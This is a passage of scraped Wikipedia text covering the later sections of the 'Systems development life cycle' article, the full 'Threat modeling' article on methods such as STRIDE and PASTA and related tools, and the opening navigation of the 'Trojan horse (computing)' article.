pseudocode
, and other deliverables.



Development
[
edit
]


Write the code.



Integration and testing
[
edit
]


Assemble the modules in a testing environment. Check for errors, bugs, and interoperability.



Acceptance, installation, deployment
[
edit
]


Put the system into production. This may involve training users, deploying hardware, and loading information from the prior system.



Maintenance
[
edit
]


Monitor the system to assess its ongoing fitness. Make modest changes and fixes as needed. To maintain the quality of the system. Continual monitoring and updates ensure the system remains effective and high-quality.
[
17
]




Evaluation
[
edit
]


The system and the process are reviewed. Relevant questions include whether the newly implemented system meets requirements and achieves project goals, whether the system is usable, reliable/available, properly scaled and fault-tolerant. Process checks include review of timelines and expenses, as well as user acceptance.



Disposal
[
edit
]


At end of life, plans are developed for discontinuing the system and transitioning to its replacement. Related information and infrastructure must be repurposed, archived, discarded, or destroyed, while appropriately protecting security.
[
18
]


In the following diagram, these stages are divided into ten steps, from definition to creation and modification of IT work products:



Systems analysis and design
[
edit
]


Systems analysis and design
 (SAD) can be considered a meta-development activity, which serves to set the stage and bound the problem. SAD can help balance competing high-level requirements. SAD interacts with distributed enterprise architecture, enterprise I.T. Architecture, and business architecture, and relies heavily on concepts such as partitioning, interfaces, personae and roles, and deployment/operational modeling to arrive at a high-level system description. This high-level description is then broken down into the components and modules which can be analyzed, designed, and constructed separately and integrated to accomplish the business goal. SDLC and SAD are cornerstones of full life cycle product and system planning.



Object-oriented analysis and design
[
edit
]


Object-oriented analysis and design
 (OOAD) is the process of analyzing a problem domain to develop a conceptual 
model
 that can then be used to guide development. During the analysis phase, a programmer develops written requirements and a formal vision document via interviews with stakeholders.

The conceptual model that results from OOAD typically consists of 
use cases
, and 
class
 and 
interaction diagrams
. It may also include a 
user interface
 mock-up.

An output 
artifact
 does not need to be completely defined to serve as input of object-oriented design; analysis and design may occur in parallel. In practice the results of one activity can feed the other in an iterative process.

Some typical input artifacts for OOAD:



Conceptual model
: A conceptual model is the result of object-oriented analysis. It captures concepts in the problem domain. The conceptual model is explicitly independent of implementation details.


Use cases
: A use case is a description of sequences of events that, taken together, complete a required task. Each use case provides 
scenarios
 that convey how the system should interact with actors (users). Actors may be end users or other systems. Use cases may further elaborated using diagrams. Such diagrams identify the actor and the processes they perform.


System Sequence Diagram
: A System Sequence diagrams (SSD) is a picture that shows, for a particular use case, the events that actors generate, their order, including inter-system events.


User interface document: Document that shows and describes the user interface.


Data model
: A data model describes how data elements relate to each other. The data model is created before the design phase. Object-oriented designs map directly from the data model. Relational designs are more involved.


System lifecycle
[
edit
]


The system lifecycle is a view of a system or proposed system that addresses all phases of its existence to include system conception, design and development, production and/or construction, distribution, operation, maintenance and support, retirement, phase-out, and disposal.
[
19
]




Conceptual design
[
edit
]


The 
conceptual design
 stage is the stage where an identified need is examined, requirements for potential solutions are defined, potential solutions are evaluated, and a system specification is developed. The system specification represents the technical requirements that will provide overall guidance for system design. Because this document determines all future development, the stage cannot be completed until a conceptual 
design review
 has determined that the system specification properly addresses the motivating need.

Key steps within the conceptual design stage include:



Need identification


Feasibility analysis


System requirements analysis


System specification


Conceptual design review


Preliminary system design
[
edit
]


During this stage of the system lifecycle, subsystems that perform the desired system functions are designed and specified in compliance with the system specification. Interfaces between subsystems are defined, as well as overall test and evaluation requirements.
[
20
]
 At the completion of this stage, a development specification is produced that is sufficient to perform detailed design and development.

Key steps within the preliminary design stage include:



Functional analysis


Requirements allocation


Detailed trade-off studies


Synthesis of system options


Preliminary design of engineering models


Development specification


Preliminary design review


For example, as the system analyst of Viti Bank, you have been tasked to examine the current information system. Viti Bank is a fast-growing bank in 
Fiji
. Customers in remote rural areas are finding difficulty to access the bank services. It takes them days or even weeks to travel to a location to access the bank services. With the vision of meeting the customers' needs, the bank has requested your services to examine the current system and to come up with solutions or recommendations of how the current system can be provided to meet its needs.



Detail design and development
[
edit
]


This stage includes the development of detailed designs that brings initial design work into a completed form of specifications. This work includes the specification of interfaces between the system and its intended environment, and a comprehensive evaluation of the systems logistical, maintenance and support requirements. The detail design and development is responsible for producing the product, process and material specifications and may result in substantial changes to the development specification.

Key steps within the detail design and development stage include:



Detailed design


Detailed synthesis


Development of engineering and 
prototype
 models


Revision of development specification


Product, process, and material specification


Critical design review


Production and construction
[
edit
]


During the production and/or construction stage the product is built or assembled in accordance with the requirements specified in the product, process and material specifications, and is deployed and tested within the operational target environment. System assessments are conducted in order to correct deficiencies and adapt the system for continued improvement.

Key steps within the product construction stage include:



Production and/or construction of system components


Acceptance testing


System distribution and operation


Operational testing and evaluation


System assessment


Utilization and support
[
edit
]


Once fully deployed, the system is used for its intended operational role and maintained within its operational environment.

Key steps within the utilization and support stage include:



System operation in the user environment


Change management


System modifications for improvement


System assessment


Phase-out and disposal
[
edit
]


Effectiveness and efficiency of the system must be continuously evaluated to determine when the product has met its maximum effective lifecycle.
[
21
]
 Considerations include: Continued existence of operational need, matching between operational requirements and system performance, feasibility of system phase-out versus maintenance, and availability of alternative systems.



Phases
[
edit
]


This section includes a 
list of references
, 
related reading
, or 
external links
, 
but its sources remain unclear because it lacks 
inline citations
.
 Please help 
improve
 this section by 
introducing
 more precise citations.
 
(
January 2023
)
 (
Learn how and when to remove this message
)


System investigation
[
edit
]


During this step, current priorities that would be affected and how they should be handled are considered. A 
feasibility study
 determines whether creating a new or improved system is appropriate. This helps to estimate costs, benefits, resource requirements, and specific user needs.

The feasibility study should address 
operational
, 
financial
, 
technical
, human factors, and 
legal/political
 concerns.



Analysis
[
edit
]


The goal of 
analysis
 is to determine where the problem is. This step involves decomposing the system into pieces, analyzing project goals, breaking down what needs to be created, and engaging users to define requirements.



Design
[
edit
]


In 
systems design
, functions and operations are described in detail, including screen layouts, business rules, process diagrams, and other documentation. Modular design reduces complexity and allows the outputs to describe the system as a collection of subsystems.

The design stage takes as its input the requirements already defined. For each requirement, a set of design elements is produced.

Design documents typically include functional hierarchy diagrams, screen layouts, business rules, process diagrams, pseudo-code, and a complete 
data model
 with a 
data dictionary
. These elements describe the system in sufficient detail that developers and engineers can develop and deliver the system with minimal additional input.



Testing
[
edit
]


The code is tested at various levels in 
software testing
. Unit, system, and user acceptance tests are typically performed. Many approaches to testing have been adopted.

The following types of testing may be relevant:



Path testing


Data set testing


Unit testing


System testing


Integration testing


Black-box testing


White-box testing


Regression testing


Automation testing


User acceptance testing


Software performance testing


Training and transition
[
edit
]


Once a system has been stabilized through testing, SDLC ensures that proper training is prepared and performed before transitioning the system to support staff and end users. Training usually covers operational training for support staff as well as end-user training.

After training, systems engineers and developers transition the system to its production environment.



Operations and maintenance
[
edit
]


Maintenance
 includes changes, fixes, and enhancements.



Evaluation
[
edit
]


The final phase of the SDLC is to measure the effectiveness of the system and evaluate potential enhancements.



Life cycle
[
edit
]


Management and control
[
edit
]


SDLC phases related to management controls
[
22
]


SDLC phase objectives are described in this section with key deliverables, a description of recommended tasks, and a summary of related control objectives for effective management. It is critical for the project manager to establish and monitor control objectives while executing projects. Control objectives are clear statements of the desired result or purpose and should be defined and monitored throughout a project. Control objectives can be grouped into major categories (domains), and relate to the SDLC phases as shown in the figure.
[
22
]


To manage and control a substantial SDLC initiative, a 
work breakdown structure
 (WBS) captures and schedules the work. The WBS and all programmatic material should be kept in the "project description" section of the project notebook.
[
clarification needed
]
 The project manager chooses a WBS format that best describes the project.

The diagram shows that coverage spans numerous phases of the SDLC but the associated MCD
[
clarification needed
]
 shows mappings to SDLC phases. For example, Analysis and Design is primarily performed as part of the Acquisition and Implementation Domain, and System Build and Prototype is primarily performed as part of delivery and support.
[
22
]




Work breakdown structured organization
[
edit
]


Work breakdown structure
[
22
]


The upper section of the WBS provides an overview of the project scope and timeline. It should also summarize the major phases and milestones. The middle section is based on the SDLC phases. WBS elements consist of milestones and tasks to be completed rather than activities to be undertaken and have a deadline. Each task has a measurable output (e.g., analysis document). A WBS task may rely on one or more activities (e.g. coding). Parts of the project needing support from contractors should have a 
statement of work
 (SOW). The development of a SOW does not occur during a specific phase of SDLC but is developed to include the work from the SDLC process that may be conducted by contractors.
[
22
]




Baselines
[
edit
]


Baselines
[
clarification needed
]
 are established after four of the five phases of the SDLC, and are critical to the 
iterative
 nature of the model.
[
23
]
 Baselines become milestones.



functional baseline: established after the conceptual design phase.


allocated baseline: established after the preliminary design phase.


product baseline: established after the detail design and development phase.


updated product baseline: established after the production construction phase.


Alternative methodologies
[
edit
]


Alternative 
software development methods
 to systems development life cycle are:



Software prototyping


Joint applications development
 (JAD)


Rapid application development
 (RAD)


Extreme programming
 (XP);


Open-source development


End-user development


Object-oriented programming




Comparison of Methodology Approaches (Post, & Anderson 2006)
[
24
]










SDLC



RAD



Open source



Objects



JAD



Prototyping



End User





Control



Formal



MIS



Weak



Standards



Joint



User



User





Time frame



Long



Short



Medium



Any



Medium



Short



Short

–







Users



Many



Few



Few



Varies



Few



One or two



One





MIS staff



Many



Few



Hundreds



Split



Few



One or two



None





Transaction/
DSS




Transaction



Both



Both



Both



DSS



DSS



DSS





Interface



Minimal



Minimal



Weak



Windows



Crucial



Crucial



Crucial





Documentation and training



Vital



Limited



Internal



In Objects



Limited



Weak



None





Integrity and security



Vital



Vital



Unknown



In Objects



Limited



Weak



Weak





Reusability



Limited



Some



Maybe



Vital



Limited



Weak



None



Strengths and weaknesses
[
edit
]


Fundamentally, SDLC trades flexibility for control by imposing structure. It is more commonly used for large scale projects with many developers.





Strength and Weaknesses of SDLC
[
24
]






Strengths



Weaknesses





Control



Increased development time





Monitor large projects



Increased development cost





Detailed steps



Systems must be defined up front





Evaluate costs and completion targets



Rigidity





Documentation



Hard to estimate costs, project overruns





Well defined user input



User input is sometimes limited





Ease of maintenance



Little parallelism





Development and design standards



Automation of documentation and standards is limited





Tolerates changes in MIS of staffing



Does not tolerate changes in requirements









Projects canned early on the result in little or no value



See also
[
edit
]


Application lifecycle management


Decision cycle


IPO model


Software development methodologies


References
[
edit
]






^
 
SELECTING A DEVELOPMENT APPROACH
. Retrieved 17 July 2014.




^
 
Parag C. Pendharkara; James A. Rodgerb; Girish H. Subramanian (November 2008). "An empirical study of the Cobb–Douglas production function properties of software development effort". 
Information and Software Technology
. 
50
 (12): 1181–1188. 
doi
:
10.1016/j.infsof.2007.10.019
.




^
 
"Systems Development Life Cycle from"
. FOLDOC
. Retrieved 
2013-06-14
.




^
 
"Software Development Life Cycle (SDLC)"
.




^
 
"SDLC Overview: Models & Methodologies"
. Retrieved 
2021-12-12
.




^
 
Arden, Trevor (1991). 
Information technology applications
. London: Pitman. 
ISBN
 
978-0-273-03470-4
.




^
 
Taylor, James (2004). 
Managing Information Technology Projects
. p. 39.




^
 
"What is Scrum?"
. December 24, 2019.




^ 
a
 
b
 
Geoffrey Elliott (2004) 
Global Business Information Technology
. p.87.




^ 
a
 
b
 
c
 
d
 
US Department of Justice (2003). 
INFORMATION RESOURCES MANAGEMENT
 Chapter 1. Introduction.




^ 
a
 
b
 
c
 
Everatt, G.D.; McLeod, R Jr (2007). 
"Chapter 2: The Software Development Life Cycle"
. 
Software Testing: Testing Across the Entire Software Development Life Cycle
. John Wiley & Sons. pp. 29–58. 
ISBN
 
9780470146347
.




^
 
Unhelkar, B. (2016). 
The Art of Agile Practice: A Composite Approach for Projects and Organizations
. CRC Press. pp. 56–59. 
ISBN
 
9781439851197
.




^
 
Land, S.K.
; Smith, D.B.; Walz, J.W. (2012). 
Practical Support for Lean Six Sigma Software Process Definition: Using IEEE Software Engineering Standards
. John Wiley & Sons. pp. 341–3. 
ISBN
 
9780470289952
.




^
 
Kay, Russell (May 14, 2002). 
"QuickStudy: System Development Life Cycle"
. 
ComputerWorld
.




^
 
Taylor, G.D. (2008). 
Introduction to Logistics Engineering
. CRC Press. pp. 12.6–12.18. 
ISBN
 
9781420088571
.




^
 
"Chapter 5". 
Information Systems Control and Audit
 
(PDF)
. Institute of Chartered Accountants of India. August 2013. p. 5.28.




^
 
Shah, Kazim. 
"The Maintenance Phase Of Software Development Life Cycle"
. 
primetechnologiesglobal
. kazim shah
. Retrieved 
12 May
 2024
.




^
 
Radack, S. (n.d.). 
"The system development life cycle (SDLC)"
 
(PDF)
. National Institute of Standards and Technology.




^
 
Blanchard and Fabrycky (2006). 
Systems Engineering and Analysis, Fourth Edition
. Prentice Hall. p. 19.




^
 
Dr. Joahn Gouws (2007). 
Introduction to Engineering, System Engineering
. Melikon Pty Ltd.




^
 
Cunningham, James. 
"HERC Maintenance"
. 
Fargo
. 
XXI
 (North Avenue): 49. Archived from 
the original
 on 21 January 2013
. Retrieved 
13 May
 2009
.




^ 
a
 
b
 
c
 
d
 
e
 
U.S. House of Representatives (1999). 
Systems Development Life-Cycle Policy
. p.13. 
Archived
 2013-10-19 at the 
Wayback Machine




^
 
Blanchard, B. S.
, & 
Fabrycky, W. J.
(2006) 
Systems engineering and analysis
 (4th ed.) New Jersey: Prentice Hall. p.31




^ 
a
 
b
 
Post, G., & Anderson, D., (2006). 
Management information systems: Solving business problems with information technology
. (4th ed.).  New York:  McGraw-Hill Irwin.






Further reading
[
edit
]


Cummings, Haag (2006). 
Management Information Systems for the Information Age
. Toronto, McGraw-Hill Ryerson


Beynon-Davies P. (2009). 
Business Information Systems
. Palgrave, Basingstoke. 
ISBN
 
978-0-230-20368-6


Computer World, 2002
, Retrieved on June 22, 2006, from the World Wide Web:


Management Information Systems, 2005
, Retrieved on June 22, 2006, from the World Wide Web:


External links
[
edit
]








Wikimedia Commons has media related to 
Systems Development Life Cycle
.




The Agile System Development Lifecycle


Pension Benefit Guaranty Corporation – Information Technology Solutions Lifecycle Methodology


DoD Integrated Framework Chart IFC (
front
, 
back
)


FSA Life Cycle Framework


HHS Enterprise Performance Life Cycle Framework


The Open Systems Development Life Cycle


System Development Life Cycle Evolution Modeling


Zero Deviation Life Cycle


Integrated Defense AT&L Life Cycle Management Chart
, the U.S. DoD form of this concept.


v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category




v
t
e
Systems engineering
Subfields


Aerospace engineering


Biological systems engineering


Cognitive systems engineering


Configuration management


Earth systems engineering and management


Electrical engineering


Enterprise systems engineering


Health systems engineering


Performance engineering


Reliability engineering


Safety engineering


Sociocultural Systems Engineering


Processes


Requirements engineering


Functional specification


System integration


Verification and validation


Design review


System of systems engineering


Concepts


Business process


Fault tolerance


System


System lifecycle


V-Model


Systems development life cycle


Tools


Decision-making


Function modelling


IDEF


Optimization


Quality function deployment


System dynamics


Systems Modeling Language


Systems analysis


Systems modeling


Work breakdown structure


People


James S. Albus


Ruzena Bajcsy


Benjamin S. Blanchard


Wernher von Braun


Kathleen Carley


Harold Chestnut


Wolt Fabrycky


Barbara Grosz


Arthur David Hall III


Derek Hitchins


Robert E. Machol


Radhika Nagpal


Simon Ramo


Joseph Francis Shea


Katia Sycara


Manuela M. Veloso


John N. Warfield


Related fields


Control engineering


Computer engineering


Industrial engineering


Operations research


Project management


Quality management


Risk management


Software engineering




Category












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Systems_development_life_cycle&oldid=1246152060
"


Categories
: 
Systems engineering
Computing terminology
Software development process
Software engineering
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Use American English from March 2019
All Wikipedia articles written in American English
All articles with unsourced statements
Articles with unsourced statements from August 2021
Articles needing additional references from January 2024
All articles needing additional references
Wikipedia articles needing clarification from January 2023
Articles lacking in-text citations from January 2023
All articles lacking in-text citations
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia






Process of identifying structural vulnerabilities


Threat modeling
 is a process by which potential threats, such as 
structural vulnerabilities
 or the absence of appropriate safeguards, can be identified and enumerated, and countermeasures prioritized.
[
1
]
 The purpose of threat modeling is to provide defenders with a systematic analysis of what controls or defenses need to be included, given the nature of the system, the probable attacker's profile, the most likely attack vectors, and the assets most desired by an attacker. Threat modeling answers questions like 
"Where am I most vulnerable to attack?"
, 
"What are the most relevant threats?"
, and 
"What do I need to do to safeguard against these threats?"
.

Conceptually, most people incorporate some form of threat modeling in their daily life and don't even realize it.
[
citation needed
]
 Commuters use threat modeling to consider what might go wrong during the morning journey to work and to take preemptive action to avoid possible accidents. Children engage in threat modeling when determining the best path toward an intended goal while avoiding the playground bully. In a more formal sense, threat modeling has been used to prioritize military defensive preparations since antiquity.





Evolution of technology-centric threat modeling
[
edit
]


Shortly after shared computing made its debut in the early 1960s, individuals began seeking ways to exploit security vulnerabilities for personal gain.
[
2
]
 As a result, engineers and computer scientists soon began developing threat modeling concepts for information technology systems.

Early technology-centered threat modeling methodologies were based on the concept of architectural patterns
[
3
]
 first presented by 
Christopher Alexander
 in 1977. In 1988 Robert Barnard developed and successfully applied the first profile for an IT-system attacker.

In 1994, Edward Amoroso put forth the concept of a "threat tree" in his book, "Fundamentals of Computer Security Technology.
[
4
]
" The concept of a threat tree was based on decision tree diagrams. Threat trees graphically represent how a potential threat to an IT system can be exploited.

Independently, similar work was conducted by the 
NSA
 and 
DARPA
 on a structured graphical representation of how specific attacks against IT-systems could be executed. The resulting representation was called "
attack trees
." In 1998 
Bruce Schneier
 published his analysis of cyber risks utilizing attack trees in his paper entitled "Toward a Secure System Engineering Methodology".
[
5
]
 The paper proved to be a seminal contribution in the evolution of threat modeling for IT-systems. In Schneier's analysis, the attacker's goal is represented as a "root node," with the potential means of reaching the goal represented as "leaf nodes." Utilizing the attack tree in this way allowed cybersecurity professionals to systematically consider multiple attack vectors against any defined target.

In 1999, Microsoft cybersecurity professionals 
Loren Kohnfelder
 and Praerit Garg developed a model for considering attacks relevant to the Microsoft Windows development environment.  (
STRIDE
[
1
]
 is an 
acrostic
 for: Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, Elevation of privilege) The resultant mnemonic helps security professionals systematically determine how a potential attacker could utilize any threat included in STRIDE.

In 2003, OCTAVE
[
6
]
 (Operationally Critical Threat, Asset, and Vulnerability Evaluation) method, an operations-centric threat modeling methodology, was introduced with a focus on organizational risk management.

In 2004, Frank Swiderski and 
Window Snyder
 wrote "Threat Modeling," published by Microsoft press. In it they developed the concept of using threat models to create secure applications.

In 2014, Ryan Stillions expressed the idea that 
cyber threats
 should be expressed with different semantic levels, and proposed the DML (Detection Maturity Level) model.
[
7
]
 An attack is an instantiation of a threat scenario which is caused by a specific attacker with a specific goal in mind and a strategy for reaching that goal. The goal and strategy represent the highest semantic levels of the DML model. This is followed by the TTP (Tactics, Techniques and Procedures) which represent intermediate semantic levels. The lowest semantic levels of the DML model are the tools used by the attacker, host and observed network artifacts such as packets and payloads, and finally atomic indicators such as IP addresses at the lowest semantic level. Current 
SIEM
 (Security Information and Event Management) tools typically only provide indicators at the lowest semantic levels. There is therefore a need to develop SIEM tools that can provide threat indicators at higher semantic levels.
[
8
]




Threat Modeling Manifesto
[
edit
]


The threat modeling manifesto is a document published in 2020 by threat modeling authorities in order to clearly state the core values and principles that every threat modeler should know and follow.
[
9
]


In 2024 the same group of authors followed up the Manifesto with a Threat Modeling Capabilities document, which "...provides a catalog of capabilities to help you cultivate value from your Threat Modeling practice".
[
10
]




Threat modeling frameworks
[
edit
]


Conceptually, a threat modeling practice flows from a methodology. Numerous threat modeling methodologies are available for implementation. Typically, threat modeling has been implemented using one of five approaches independently: asset-centric, attacker-centric, software-centric, value and stakeholder-centric, and hybrid. Based on the volume of published online content, the methodologies discussed below are the most well known.



STRIDE
[
edit
]


The 
STRIDE
 was created in 1999 at Microsoft as a mnemonic for developers to find 'threats to our products'.
[
11
]
 STRIDE can be used as a simple prompt or checklist, or in more structured approaches such as STRIDE per element.  STRIDE, Patterns and Practices, and Asset/entry point were amongst the threat modeling approaches developed and published by Microsoft.   References to "the" Microsoft methodology commonly mean STRIDE and Data Flow Diagrams.



PASTA
[
edit
]


The Process for Attack Simulation and Threat Analysis (PASTA) is a seven-step, risk-centric methodology.
[
12
]
 It provides a seven-step process for aligning business objectives and technical requirements, taking into account compliance issues and business analysis. The intent of the method is to provide a dynamic threat identification, enumeration, and scoring process. Once the threat model is completed, security subject matter experts develop a detailed analysis of the identified threats. Finally, appropriate security controls can be enumerated. This methodology is intended to provide an attacker-centric view of the application and infrastructure from which defenders can develop an asset-centric mitigation strategy.



Trike
[
edit
]


The focus of the Trike methodology
[
13
]
 is using threat models as a risk-management tool. Within this framework, threat models are used to satisfy the security auditing process. Threat models are based on a "requirements model." The requirements model establishes the stakeholder-defined "acceptable" level of risk assigned to each asset class. Analysis of the requirements model yields a threat model from which threats are enumerated and assigned risk values. The completed threat model is used to construct a risk model based on asset, roles, actions, and calculated risk exposure.



VAST
[
edit
]


The Visual, Agile and Simple Threat (VAST) methodology,
[
14
]
 is based on ThreatModeler, a commercial automated threat-modeling platform. VAST requires creating two types of models: application threat models and operational threat models. Application threat models use process-flow diagrams, representing the architectural point of view. Operational threat models are created from an attacker point of view based on DFDs. This approach allows for the integration of VAST into the organization's development and DevOps lifecycles.
[
15
]




'The Hybrid' Threat Modeling Method
[
edit
]


Researchers created this method to combine the positive elements of different methodologies.
[
16
]
[
17
]
[
18
]
 This methodology combines different methodologies, including SQUARE
[
19
]
 and the Security Cards
[
20
]
 and Personae Non Gratae.
[
21
]




Generally accepted technology threat modeling processes
[
edit
]


All IT-related threat modeling processes start with creating a visual representation of the application, infrastructure or both being analyzed. The application or infrastructure is decomposed into various elements to aid in the analysis. Once completed, the visual representation is used to identify and enumerate potential threats. Further analysis of the model regarding risks associated with identified threats, prioritization of threats, and enumeration of the appropriate mitigating controls depends on the methodological basis for the threat model process being utilized. Threat modeling approaches can focus on the system in use, attackers, or assets. 



Visual representations based on data flow diagrams
[
edit
]




Most threat modeling approaches use 
data flow diagrams
 (DFD). DFDs were developed in the 1970s as tool for system engineers to communicate, on a high level, how an application caused data to flow, be stored, and manipulated by the infrastructure upon which the application runs. Traditionally, DFDs utilize only four unique symbols: data flows, data stores, processes, and interactors. In the early 2000s, an additional symbol, trust boundaries, were added to improve the usefulness of DFDs for threat modeling.

Once the application-infrastructure system is decomposed into its five elements, security experts consider each identified threat entry point against all known threat categories. Once the potential threats are identified, mitigating security controls can be enumerated or additional analysis can be performed.



Threat modeling tools
[
edit
]


Microsoft's free 
Threat Modeling Tool
 (formerly SDL Threat Modeling Tool),
[
22
]
 also uses the Microsoft threat modeling methodology, is based on DFD and identifies threats based on the STRIDE threat classification system. It is mainly intended for general use.


IriusRisk
 provides both a community and a commercial version of the tool. This tool focuses on creating and maintaining a living threat model throughout the 
SDLC
. It drives the process using fully customizable questionnaires and risk model libraries, and connects to several other different tools (OWASP ZAP, BDD-Security, Threadfix) to enable automation.
[
23
]


securiCAD
 is a threat modeling and risk management tool from the Scandinavian company foreseeti.
[
24
]
 It is intended for enterprise cybersecurity management, from 
CISO
 to security engineer, including technician. securiCAD performs automated attack simulations on current and future IT architectures, identifies and quantifies risks globally, including structural vulnerabilities, and provides decision support based on results. securiCAD is available in commercial and community editions.
[
25
]


SD Elements by Security Compass
 is a software security requirements management platform that includes automated threat modeling capabilities. A set of threats is generated by filling out a short questionnaire on the application's technical details and compliance factors. Countermeasures are included in the form of actionable tasks for developers that can be tracked and managed across the SDLC.
[
26
]


OWASP Threat Dragon
 is a modeling tool used to create threat model diagrams as part of a secure development lifecycle. Threat Dragon follows the values and principles of the threat modeling manifesto. It can be used to record possible threats and decide on their mitigations, as well as giving a visual indication of the threat model components and threat surfaces. Threat Dragon runs either as a web application or as a desktop application. Threat Dragon supports STRIDE / LINDDUN / CIA / DIE / PLOT4ai, provides modeling diagrams and implements a rule engine to auto-generate threats and their mitigations.
[
27
]


OWASP pytm
 is a Pythonic framework for threat modeling and the first Threat-Model-as-Code tool: The system is first defined in Python using the elements and properties described in the pytm framework. Based on this definition, pytm can generate a Data Flow Diagram (DFD), a Sequence Diagram and most important of all, threats to the system.
[
28
]


Further fields of application
[
edit
]


Threat modeling is being applied not only to IT but also to other areas such as vehicle,
[
29
]
[
30
]
 
building
 and 
home automation
.
[
31
]
 In this context, threats to security and privacy like information about the inhabitant's movement profiles, working times, and health situations are modeled as well as physical or network-based attacks. The latter could make use of more and more available smart building features, i.e., sensors (e.g., to spy on the inhabitant) and actuators (e.g., to unlock doors).
[
31
]




References
[
edit
]






^ 
a
 
b
 
"The STRIDE Threat Model"
. Microsoft. 2016.




^
 
McMillan, Robert (2012). 
"The World's First Computer Password? It Was Useless Too"
. Wired Business.




^
 
Shostack, Adam
 (2014). 
"Threat Modeling: Designing for Security"
. John Wiley & Sons Inc: Indianapolis.




^
 
Amoroso, Edward G (1994). 
Fundamentals of Computer Security Technology
. AT&T Bell Labs. Prentice-Hall: Upper Saddle River. 
ISBN
 
9780131089297
.




^
 
Schneier, Bruce; et al. (1998). 
"Toward A Secure System Engineering Methodology"
 
(PDF)
. National Security Agency: Washington.




^
 
Alberts, Christopher (2003). 
"Introduction to the OCTAVE® Approach"
 
(PDF)
. Software Engineering Institute, Carnegie Mellon: Pittsburgh.




^
 
Stillions, Ryan (2014). 
"The DML Model"
. 
Ryan Stillions security blog
. Ryan Stillions.




^
 
Bromander, Siri (2016). 
"Semantic Cyberthreat Modelling"
 
(PDF)
. Semantic Technology for Intelligence, Defence and Security (STIDS 2016).




^
 
"Threat Modeling Manifesto"
.




^
 
"Threat Modeling Capabilities"
.




^
 
Kohnfelder, Loren; Garg, Praerit. 
"Threats to Our Products"
. Microsoft
. Retrieved 
4 Feb
 2024
.
 




^
 
Ucedavélez, Tony and Marco M. Morana (2015). 
"Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis"
. John Wiley & Sons: Hobekin.




^
 
Eddington, Michael, Brenda Larcom, and Eleanor Saitta (2005). 
"Trike v1 Methodology Document"
. 
Octotrike.org
.
{{
cite web
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
Fruhlinger, Josh (2020-04-15). 
"Threat modeling explained: A process for anticipating cyber attacks"
. 
CSO Online
. Retrieved 
2022-02-03
.




^
 
"Threat Modeling: 12 Available Methods"
. 
SEI Blog
. 2 December 2018
. Retrieved 
2022-02-03
.




^
 
"The Hybrid Threat Modeling Method"
. 22 April 2018.




^
 
"A Hybrid Threat Modeling Method"
. 27 March 2018.




^
 
Tarandach, Izar; Coles, Matthew J. (24 November 2020). 
Threat Modeling: A Practical Guide for Development Teams
. O'Reilly Media, Incorporated. 
ISBN
 
978-1492056553
.




^
 
"Security Quality Requirements Engineering Technical Report"
. 31 October 2005.




^
 
https://securitycards.cs.washington.edu/
 
[
bare URL
]




^
 
"CSDL | IEEE Computer Society"
.




^
 
"What's New with Microsoft Threat Modeling Tool 2016"
. 
Microsoft Secure Blog
. Microsoft. 2015.




^
 
"Irius Risk Risk Management Tool"
. Continuum Security. 2016.




^
 
"foreseeti - securiCAD"
. 
foreseeti.com
. Retrieved 
November 27,
 2018
.




^
 
"Cyber Threat Modelling and Risk Management - securiCAD by foreseeti"
. foreseeti.




^
 
"SD Elements by Security Compass"
. 
www.securitycompass.com
. Retrieved 2017-03-24.




^
 
"OWASP Threat Dragon"
.




^
 
"OWASP pytm"
.




^
 
http://publications.lib.chalmers.se/records/fulltext/252083/local_252083.pdf
 
[
bare URL PDF
]




^
 
Hamad, Mohammad; Prevelakis, Vassilis; Nolte, Marcus (November 2016). 
"Towards Comprehensive Threat Modeling for Vehicles"
 
(PDF)
. 
Institute of Control Engineering
. Publications Institute of Computer and Network Engineering. 
doi
:
10.24355/dbbs.084-201806251532-0
. Retrieved 
11 March
 2019
.




^ 
a
 
b
 
Meyer, D.; Haase, J.; Eckert, M.; Klauer, B. (2016-07-01). "A threat-model for building and home automation". 
2016 IEEE 14th International Conference on Industrial Informatics (INDIN)
. pp. 860–866. 
doi
:
10.1109/INDIN.2016.7819280
. 
ISBN
 
978-1-5090-2870-2
. 
S2CID
 
12725362
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Threat_model&oldid=1244222841
"


Category
: 
Computer security exploits
Hidden categories: 
CS1 maint: multiple names: authors list
All articles with bare URLs for citations
Articles with bare URLs for citations from August 2024
Articles with bare URLs for citations from March 2022
Articles with PDF format bare URLs for citations
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from May 2022











From Wikipedia, the free encyclopedia






Type of malware
This article is about the type of computer malware. For the wooden horse in Greek mythology, see 
Trojan Horse
. For other uses, see 
Trojan Horse (disambiguation)
.






Part of a series on
Computer hacking


History


Phreaking


Cryptovirology


Hacking of consumer electronics


List of hackers




Hacker culture
 and 
ethic


Hackathon


Hacker Manifesto


Hackerspace


Hacktivism


Maker culture


Types of 
hackers


Black hat


Grey hat


White hat




Conferences


Black Hat Briefings


Chaos Communication Congress


DEF CON


Hackers on Planet Earth


Security BSides


ShmooCon


Summercon




Computer crime


Crimeware


List of computer criminals


Script kiddie




Hacking tools


Exploit


forensics-focused operating systems


Payload


Social engineering


Vulnerability




Practice sites


HackThisSite


